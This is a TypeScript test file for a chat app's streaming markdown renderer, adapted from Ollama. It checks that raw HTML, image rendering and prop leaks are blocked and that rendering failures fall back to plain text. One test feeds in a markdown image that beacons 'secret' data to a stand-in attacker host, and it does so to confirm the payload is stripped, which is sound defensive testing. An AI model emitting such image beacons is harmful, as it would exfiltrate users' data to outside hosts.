/*
 * SPDX-License-Identifier: MIT
 * SPDX-FileCopyrightText: Ollama
 * SPDX-FileCopyrightText: 2026 Elwynn18 and ChatonLM contributors
 *
 * Adapted from Ollama (https://github.com/ollama/ollama),
 * file app/ui/app/src/components/StreamingMarkdownContent.test.tsx, commit 42e911bc3d05.
 * Modified for ChatonLM: named export, no citation plugin; checks of the
 * other Streamdown settings, of the table override and of the error fallback.
 * Rendering with the real Streamdown: StreamingMarkdownContent.render.test.tsx.
 */

import { cleanup, render } from "@testing-library/react";
import type React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

type MockStreamdownProps = {
  children?: React.ReactNode;
  components: {
    img: React.ComponentType<React.ImgHTMLAttributes<HTMLImageElement>>;
    table: React.ComponentType<
      React.TableHTMLAttributes<HTMLTableElement> & { node?: unknown }
    >;
  };
  rehypePlugins?: unknown[];
  remarkPlugins?: unknown[];
  parseIncompleteMarkdown?: boolean;
  isAnimating?: boolean;
  controls?: unknown;
};

const streamdownMock = vi.hoisted(() =>
  vi.fn((props: MockStreamdownProps) => props.children),
);

vi.mock("streamdown", () => ({
  Streamdown: streamdownMock,
  defaultRehypePlugins: {
    katex: "katex",
    raw: "raw",
    harden: "harden",
  },
  defaultRemarkPlugins: {
    gfm: "gfm",
    math: "math",
  },
}));

// Texte dont la réparation lève une exception (lexer de marked).
const failingRepair = vi.hoisted(() => ({ text: null as string | null }));
vi.mock("@/lib/markdownRepair", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/markdownRepair")>();
  return {
    ...actual,
    repairIncompleteMarkdown: (text: string) => {
      if (text === failingRepair.text) throw new Error("Infinite loop");
      return actual.repairIncompleteMarkdown(text);
    },
  };
});

import { StreamingMarkdownContent } from "./StreamingMarkdownContent";

describe("StreamingMarkdownContent", () => {
  beforeEach(() => {
    streamdownMock.mockClear();
  });

  afterEach(() => {
    cleanup();
    vi.restoreAllMocks();
  });

  it("does not enable raw HTML parsing", () => {
    renderToStaticMarkup(
      <StreamingMarkdownContent content="<iframe></iframe>" />,
    );

    const props = streamdownMock.mock.calls[0][0];
    expect(props.rehypePlugins).toEqual(["katex"]);
    expect(props.rehypePlugins).not.toContain("raw");
    // Pas de greffon de citations (recherche web, hors V1).
    expect(props.remarkPlugins).toEqual(["gfm", "math"]);
  });

  it("does not render markdown image src values", () => {
    renderToStaticMarkup(
      <StreamingMarkdownContent content="![secret](https://attacker.example/pixel?data=secret)" />,
    );

    const props = streamdownMock.mock.calls[0][0];
    const Img = props.components.img;
    const html = renderToStaticMarkup(
      <Img alt="secret" src="https://attacker.example/pixel?data=secret" />,
    );

    expect(html).not.toContain("<img");
    expect(html).not.toContain("attacker.example");
    expect(html).toContain("secret");
    expect(
      renderToStaticMarkup(<Img alt="" src="https://attacker.example/x" />),
    ).toBe("");
  });

  it("does not leak the node prop onto tables", () => {
    renderToStaticMarkup(<StreamingMarkdownContent content="| a |" />);

    const Table = streamdownMock.mock.calls[0][0].components.table;
    const html = renderToStaticMarkup(
      <Table node={{ type: "element", tagName: "table" }}>
        <tbody />
      </Table>,
    );

    expect(html).not.toContain("node=");
    expect(html).toBe(
      '<div class="overflow-x-auto max-w-full"><table class="border-collapse w-full border border-neutral-200 dark:border-neutral-700 rounded-lg overflow-hidden"><tbody></tbody></table></div>',
    );
  });

  it("repairs incomplete Markdown itself, only while streaming, without Streamdown's buttons", () => {
    const { container, rerender } = render(
      <StreamingMarkdownContent content={"Done.\n\n**a"} isStreaming />,
    );
    expect(streamdownMock.mock.lastCall?.[0]).toMatchObject({
      children: "Done.\n\n**a**",
      parseIncompleteMarkdown: false,
      isAnimating: true,
      controls: false,
    });
    // Texte rendu par le faux Streamdown.
    const text = container.querySelector("div")?.firstChild;

    rerender(<StreamingMarkdownContent content={"Done.\n\n**a"} />);
    expect(streamdownMock.mock.lastCall?.[0]).toMatchObject({
      children: "Done.\n\n**a",
      parseIncompleteMarkdown: false,
      isAnimating: false,
      controls: false,
    });
    // Pas de remontage à la fin du flux : le même nœud, mis à jour.
    expect(container.querySelector("div")?.firstChild).toBe(text);
    expect(text?.textContent).toBe("Done.\n\n**a");
  });

  it("gives Streamdown the same components on every render (its blocks ignore new ones)", () => {
    const { rerender } = render(
      <StreamingMarkdownContent content="a" isStreaming />,
    );
    rerender(<StreamingMarkdownContent content="ab" isStreaming />);

    const [first, second] = streamdownMock.mock.calls.map(([p]) => p);
    expect(second.components).toBe(first.components);
    expect(second.rehypePlugins).toBe(first.rehypePlugins);
    expect(second.remarkPlugins).toBe(first.remarkPlugins);
  });

  it("shows the text with its line breaks if rendering fails, and retries when the content changes", () => {
    const error = vi.spyOn(console, "error").mockImplementation(() => {});
    streamdownMock.mockImplementation((props) => {
      if (props.children === "boom\n  second line") throw new Error("bad");
      return props.children;
    });

    const { container, rerender } = render(
      <StreamingMarkdownContent content={"boom\n  second line"} isStreaming />,
    );

    const fallback = container.querySelector(".whitespace-pre-wrap");
    expect(fallback?.textContent).toBe("boom\n  second line");
    expect(fallback?.className).toBe("whitespace-pre-wrap break-words");
    expect(error).toHaveBeenCalledWith(
      "StreamingMarkdownContent: caught rendering error",
      expect.any(Error),
      expect.anything(),
    );

    rerender(<StreamingMarkdownContent content="fine" isStreaming />);
    expect(container.querySelector(".whitespace-pre-wrap")).toBeNull();
    expect(container.textContent).toBe("fine");
    streamdownMock.mockImplementation((props) => props.children);
  });

  it("falls back to the text, not a broken page, if repairing it fails", () => {
    const error = vi.spyOn(console, "error").mockImplementation(() => {});
    failingRepair.text = "**odd\n  text";

    const { container, rerender } = render(
      <StreamingMarkdownContent content={"**odd\n  text"} isStreaming />,
    );
    expect(container.querySelector(".whitespace-pre-wrap")?.textContent).toBe(
      "**odd\n  text",
    );
    expect(error).toHaveBeenCalledWith(
      "StreamingMarkdownContent: caught rendering error",
      expect.any(Error),
      expect.anything(),
    );

    rerender(
      <StreamingMarkdownContent content={"**odd\n  text."} isStreaming />,
    );
    expect(container.querySelector(".whitespace-pre-wrap")).toBeNull();
    expect(container.textContent).toBe("**odd\n  text.**");
    failingRepair.text = null;
  });
});
